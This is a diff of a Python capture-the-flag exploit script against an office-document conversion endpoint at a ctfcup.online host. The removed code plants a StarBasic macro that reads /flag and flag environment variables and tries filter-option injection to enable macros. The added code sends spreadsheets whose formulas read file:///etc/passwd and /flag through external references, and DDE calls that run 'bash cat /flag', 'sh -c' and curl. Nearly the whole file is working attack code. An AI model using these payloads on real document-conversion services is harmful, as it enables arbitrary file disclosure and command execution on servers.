@@ -1,84 +1,44 @@
 #!/usr/bin/env python3
-"""Temporary CTF Calc Basic-formula probe using a LO-authored ODS skeleton."""
+"""Temporary CTF native Calc external-reference/DDE probe."""
+import html
 import io
-import pathlib
 import urllib.error
 import urllib.request
 import uuid
 import zipfile
 
 BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
-SKELETON = pathlib.Path(__file__).with_name("macro_skeleton.ods")
-
-BASIC = r'''Function ReadLocal(path As String) As String
-    Dim i As Integer
-    Dim line As String
-    Dim result As String
-    On Error GoTo Failed
-    i = FreeFile
-    Open path For Input As #i
-    Do While Not EOF(i)
-        Line Input #i, line
-        result = result & line & Chr(10)
-    Loop
-    Close #i
-    ReadLocal = result
-    Exit Function
-Failed:
-    ReadLocal = "READ_FAILED:" & path
-End Function
-
-Function PocFunc() As String
-    Dim s As String
-    Dim f As String
-    s = "MACRO_EXECUTED" & Chr(10)
-    s = s & "ENV_FLAG=" & Environ("FLAG") & Chr(10)
-    s = s & "ENV_CTF_FLAG=" & Environ("CTF_FLAG") & Chr(10)
-    s = s & "FILE_FLAG=" & ReadLocal("/flag") & Chr(10)
-    On Error Resume Next
-    f = Dir("/", 0)
-    Do While f <> ""
-        s = s & "ROOT=" & f & Chr(10)
-        f = Dir()
-    Loop
-    PocFunc = s
-End Function
-'''
 
 
-def build_ods():
-    with zipfile.ZipFile(SKELETON) as src:
-        items = [(info, src.read(info.filename)) for info in src.infolist()]
-    esc = BASIC.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
-    module = (
-        '<?xml version="1.0" encoding="UTF-8"?>\n'
-        '<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">\n'
-        '<script:module xmlns:script="http://openoffice.org/2000/script" '
-        'script:name="Module1" script:language="StarBasic">' + esc + '</script:module>'
-    ).encode()
+def formula_ods(formula):
+    content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" office:version="1.2">
+<office:body><office:spreadsheet><table:table table:name="Sheet1"><table:table-row>
+<table:table-cell table:formula="of:={html.escape(formula, quote=True)}" office:value-type="string"><text:p></text:p></table:table-cell>
+</table:table-row></table:table></office:spreadsheet></office:body></office:document-content>'''
+    manifest = '''<?xml version="1.0" encoding="UTF-8"?>
+<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
+<manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.spreadsheet"/>
+<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
+</manifest:manifest>'''
     out = io.BytesIO()
     with zipfile.ZipFile(out, "w") as z:
-        for info, data in items:
-            if info.filename == "Basic/Standard/Module1.xml":
-                data = module
-            z.writestr(info, data)
+        z.writestr("mimetype", "application/vnd.oasis.opendocument.spreadsheet", compress_type=zipfile.ZIP_STORED)
+        z.writestr("content.xml", content, compress_type=zipfile.ZIP_DEFLATED)
+        z.writestr("META-INF/manifest.xml", manifest, compress_type=zipfile.ZIP_DEFLATED)
     return out.getvalue()
 
 
-def send(data, infilter, label):
+def send(formula):
+    data = formula_ods(formula)
     boundary = "----Arena" + uuid.uuid4().hex
-    parts = []
-    if infilter is not None:
-        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"infilterOptions\"\r\n\r\n{infilter}\r\n".encode())
-    parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"macro.ods\"\r\nContent-Type: application/vnd.oasis.opendocument.spreadsheet\r\n\r\n".encode())
-    parts.append(data)
-    parts.append(f"\r\n--{boundary}--\r\n".encode())
-    req = urllib.request.Request(BASE + "/cool/convert-to/csv", data=b"".join(parts), method="POST")
+    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"formula.ods\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode() + data + f"\r\n--{boundary}--\r\n".encode())
+    req = urllib.request.Request(BASE + "/cool/convert-to/csv", data=body, method="POST")
     req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
-    print("\n===", label, "INFILTER", repr(infilter), flush=True)
+    print("\n===", formula, flush=True)
     try:
         with urllib.request.urlopen(req, timeout=90) as r:
-            raw = r.read(2000000)
+            raw = r.read(1000000)
             print("STATUS", r.status, "BYTES", len(raw), "RESPONSE", raw.decode("utf-8", "replace"), flush=True)
     except urllib.error.HTTPError as e:
         print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
@@ -86,14 +46,14 @@ def send(data, infilter, label):
         print("ERROR", repr(e), flush=True)
 
 
-def main():
-    doc = build_ods()
-    print("ODS_BYTES", len(doc), flush=True)
-    send(doc, None, "CONTROL")
-    send(doc, "EnableMacrosExecution=true,MacroSecurityLevel=0", "ORIGINAL_CHAIN")
-    send(doc, "x enableMacrosExecution=true macroSecurityLevel=0", "LOAD_TOKEN_INJECTION")
-    send(doc, "x readonly=0 enableMacrosExecution=true macroSecurityLevel=0", "LOAD_TOKEN_INJECTION_WRITABLE")
-
-
-if __name__ == "__main__":
-    main()
+for formula in (
+    "'file:///etc/passwd'#$Sheet1.A1",
+    "T('file:///etc/passwd'#$Sheet1.A1)",
+    "'file:///flag'#$Sheet1.A1",
+    "T('file:///flag'#$Sheet1.A1)",
+    'DDE("bash";"cat /flag";"")',
+    'DDE("sh";"-c cat /flag";"")',
+    'DDE("soffice";"file:///flag";"A1")',
+    'DDE("curl";"http://webapp:8000/";"")',
+):
+    send(formula)
